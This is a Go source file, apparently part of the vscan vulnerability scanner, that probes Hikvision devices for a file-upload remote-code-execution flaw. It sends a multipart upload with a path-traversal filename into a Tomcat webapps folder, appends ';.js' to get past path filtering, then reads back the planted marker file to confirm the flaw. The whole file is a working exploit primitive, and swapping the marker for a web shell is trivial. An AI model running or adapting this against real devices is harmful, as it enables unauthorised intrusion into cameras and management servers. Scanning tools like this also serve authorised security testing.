package HIKVISION

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func Hikvision_api_files_rce(u string) bool {
	payload := `--ea26cdac4990498b32d7a95ce5a5135c
Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/153107607.txt"    
Content-Type: application/octet-stream

332299402
--ea26cdac4990498b32d7a95ce5a5135c--`

	header := make(map[string]string)
	header["Content-Type"] = "multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c"

	if response, err := pkg.HttpRequset(u+"/center/api/files;.js", "POST", payload, false, header); err == nil {
		if req2, err := pkg.HttpRequset(u+"/clusterMgr/153107607.txt;.js", "GET", "", false, nil); err == nil {
			if response.StatusCode == 200 && strings.Contains(req2.Body, "332299402") {
				pkg.GoPocLog(fmt.Sprintf("Found vuln hikvision api_file_upload_rce|%s\n", u+"/clusterMgr/153107607.txt;.js"))
				return true
			}
		}
	}
	return false
}
